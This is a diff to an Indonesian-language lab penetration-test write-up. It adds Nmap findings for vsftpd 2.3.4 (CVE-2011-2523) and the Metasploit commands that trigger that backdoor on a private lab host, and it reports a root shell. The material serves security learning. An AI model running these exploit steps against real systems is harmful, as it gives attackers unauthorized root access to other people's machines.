@@ -31,6 +31,17 @@ Langkah awal dilakukan dengan pemindaian port menggunakan **Nmap** untuk mengide
 
 ```bash
 nmap -sV 192.168.56.101
+```
 
+Temuan: Ditemukan Port 21 terbuka menjalankan layanan vsftpd 2.3.4. Berdasarkan database kerentanan umum, versi ini memiliki celah Backdoor Command Execution (CVE-2011-2523).
 
+## ⚔️ 2. Exploitation (Getting Root)
+Menggunakan Metasploit Framework, modul exploit exploit/unix/ftp/vsftpd_234_backdoor dimuat untuk memicu backdoor yang tertanam pada layanan tersebut.
 
+```bash
+msf6 > use 1
+msf6 > set RHOSTS 192.168.56.101
+msf6 > exploit
+```
+Hasil: Serangan berhasil membuka sesi command shell. Verifikasi menggunakan perintah whoami menunjukkan akses sebagai root (Administrator).
+<img width="747" height="253" alt="image" src="https://github.com/user-attachments/assets/0fcff6be-86f6-420e-a9c3-7a6d04826055" />
